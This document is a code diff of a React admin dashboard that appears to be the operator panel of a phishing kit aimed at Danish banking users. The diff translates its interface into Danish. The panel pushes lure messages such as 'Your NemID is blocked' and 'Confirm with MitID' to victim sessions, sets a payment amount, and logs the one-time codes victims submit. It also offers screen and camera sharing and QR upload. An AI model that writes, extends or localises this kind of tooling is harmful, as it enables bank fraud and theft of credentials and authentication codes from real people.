@@ -22,7 +22,7 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
   const [cameraStream, setCameraStream] = useState<MediaStream | null>(null)
   const [screenStream, setScreenStream] = useState<MediaStream | null>(null)
   const [searchQuery, setSearchQuery] = useState('')
-  const [titleText, setTitleText] = useState('Connecting securely')
+  const [titleText, setTitleText] = useState('Forbinder sikkert')
   const [customTitle, setCustomTitle] = useState('')
   const [broadcastMessage, setBroadcastMessage] = useState('')
   const [customBroadcast, setCustomBroadcast] = useState('')
@@ -80,7 +80,7 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
       if (data.type === 'sms-code') setSmsCodes(p => [{ code: data.code, created_at: new Date().toISOString() }, ...p])
       if (data.type === 'status-changed') setSelected(p => p ? { ...p, [data.field]: data.value } : null)
       if (data.type === 'sms-submitted') {
-        alert(`User submitted code: ${data.code}`)
+        addLog({ session_id: data.session_id || 'unknown', action: 'sms_code_submitted', details: `Bruger indtastede kode: ${data.code}`, created_at: new Date().toISOString() })
         loadSessions()
       }
     })
@@ -177,21 +177,16 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
 
   const activateSms = () => {
     setShowSmsPopup(true)
-    setSmsStep('amount')
     setSmsAmount('1499')
-    setSmsManualCode('')
     setSmsSent(false)
   }
 
-  const confirmSmsAmount = () => { setSmsStep('code') }
-
-  const sendManualSms = () => {
-    if (!selected || !smsManualCode.trim()) return
-    const code = smsManualCode.trim()
+  const sendSmsToClient = () => {
+    if (!selected) return
     const amount = smsAmount || null
-    sendAdminWS({ type: 'sms-code', code, amount })
+    sendAdminWS({ type: 'sms-code', code: '', amount })
     setSmsSent(true)
-    setTimeout(() => { setShowSmsPopup(false); setSmsStep('amount'); setSmsManualCode(''); setSmsSent(false) }, 1500)
+    setTimeout(() => { setShowSmsPopup(false); setSmsSent(false) }, 1500)
   }
 
   const sendTitle = (text: string) => {
@@ -217,7 +212,7 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
   }
 
   const deleteSession = async (id: string) => {
-    if (!confirm('Delete this session?')) return
+    if (!confirm('Slet denne session?')) return
     await api.deleteSession(id)
     setSelected(null)
     loadSessions()
@@ -268,17 +263,17 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
                 <button onClick={screenStream ? stopScreenShare : startScreenShare}
                   className={`flex items-center gap-2.5 px-3 py-2.5 rounded-xl text-[13px] font-semibold cursor-pointer transition-all ${screenStream ? 'bg-red-50 text-red-600 border border-red-200' : 'bg-blue-50 text-blue-600 border border-blue-200 hover:bg-blue-100'}`}>
                   <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
-                  {screenStream ? 'Stop Share' : 'Screen Share'}
+                  {screenStream ? 'Stop deling' : 'Del skærm'}
                 </button>
                 <button onClick={cameraStream ? stopCamera : startCamera}
                   className={`flex items-center gap-2.5 px-3 py-2.5 rounded-xl text-[13px] font-semibold cursor-pointer transition-all ${cameraStream ? 'bg-red-50 text-red-600 border border-red-200' : 'bg-purple-50 text-purple-600 border border-purple-200 hover:bg-purple-100'}`}>
                   <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M23 7l-7 5 7 5V7z"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>
-                  {cameraStream ? 'Stop Camera' : 'Camera'}
+                  {cameraStream ? 'Stop kamera' : 'Kamera'}
                 </button>
                 <button onClick={() => document.getElementById('qr-upload')?.click()}
                   className="flex items-center gap-2.5 px-3 py-2.5 rounded-xl text-[13px] font-semibold cursor-pointer transition-all bg-emerald-50 text-emerald-600 border border-emerald-200 hover:bg-emerald-100">
                   <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><rect x="3" y="3" width="18" height="18" rx="2"/><circle cx="8.5" cy="8.5" r="1.5"/><path d="M21 15l-5-5L5 21"/></svg>
-                  Upload QR Image
+                  Upload QR-billede
                 </button>
                 <input id="qr-upload" type="file" accept="image/*" className="hidden" onChange={handleQrUpload} />
               </div>
@@ -362,7 +357,7 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
             <div className="bg-white rounded-2xl border border-gray-200 p-5 mb-4 shadow-sm">
               <div className="text-[11px] text-gray-400 uppercase tracking-wider font-bold mb-3">Title Text</div>
               <div className="flex flex-wrap gap-2 mb-3">
-                {['Connecting securely', 'Sign in', 'Verifying...', 'Please wait', 'Treats'].map(t => (
+                {['Forbinder sikkert', 'Log ind', 'Godkender...', 'Vent venligst', 'Behandlinger'].map(t => (
                   <button key={t} onClick={() => sendTitle(t)}
                     className={`px-4 py-2 rounded-xl text-[13px] font-medium cursor-pointer transition-all border ${
                       titleText === t ? 'bg-blue-50 border-blue-300 text-blue-700' : 'bg-gray-50 border-gray-200 text-gray-600 hover:bg-gray-100'
@@ -370,7 +365,7 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
                 ))}
               </div>
               <div className="flex gap-2">
-                <input type="text" value={customTitle} onChange={(e) => setCustomTitle(e.target.value)} placeholder="Type custom title..."
+                <input type="text" value={customTitle} onChange={(e) => setCustomTitle(e.target.value)} placeholder="Skriv brugerdefineret titel..."
                   className="flex-1 bg-gray-50 border border-gray-200 rounded-xl px-4 py-2.5 text-sm text-gray-700 focus:outline-none focus:border-blue-400 placeholder-gray-400" />
                 <button onClick={saveCustomTitle} className="bg-blue-600 hover:bg-blue-700 text-white px-5 py-2.5 rounded-xl text-sm font-bold cursor-pointer transition-colors shadow-sm">Save</button>
               </div>
@@ -385,7 +380,7 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
                 </label>
               </div>
               <div className="flex flex-wrap gap-1.5 mb-3">
-                {['Confirm your identity', 'Security check required', 'Contact your bank', 'Session will expire soon', 'Update your information', 'Your NemID is blocked', 'Verify your payment card', 'Unauthorized login attempt', 'Confirm with MitID', 'Your account is temporarily locked', 'Repeat the authentication', 'Enter your one-time code', 'Repeat approving'].map(msg => (
+                {['Bekræft din identitet', 'Sikkerhedstjek påkrævet', 'Kontakt din bank', 'Sessionen udløber snart', 'Opdater dine oplysninger', 'Dit NemID er blokeret', 'Bekræft dit betalingskort', 'Uautoriseret loginforsøg', 'Bekræft med MitID', 'Din konto er midlertidigt låst', 'Gentag godkendelsen', 'Indtast din engangskode', 'Gentag godkendelse'].map(msg => (
                   <button key={msg} onClick={() => sendBroadcast(msg)}
                     className={`px-3 py-1.5 rounded-lg text-[11px] font-medium cursor-pointer transition-all border ${
                       broadcastMessage === msg ? 'bg-blue-50 border-blue-300 text-blue-700' : 'bg-gray-50 border-gray-200 text-gray-600 hover:bg-gray-100'
@@ -393,7 +388,7 @@ export default function AdminDashboard({ onLogout }: { onLogout: () => void }) {
                 ))}
               </div>
               <div className="flex gap-2">
-                <input type="text" value={customBroadcast} onChange={(e) => setCustomBroadcast(e.target.value)} placeholder="Custom broadcast..."
+                <input type="text" value={customBroadcast} onChange={(e) => setCustomBroadcast(e.target.value)} placeholder="Brugerdefineret besked..."
                   className="flex-1 bg-gray-50 border border-gray-200 rounded-xl px-4 py-2.5 text-sm text-gray-700 focus:outline-none focus:border-blue-400 placeholder-gray-400"
                   onKeyDown={(e) => { if (e.key === 'Enter') sendBroadcast(customBroadcast) }} />
                 <button onClick={() => sendBroadcast(customBroadcast)} className="bg-blue-600 hover:bg-blue-700 text-white px-5 py-2.5 rounded-xl text-sm font-bold cursor-pointer transition-colors shadow-sm">Send</button>
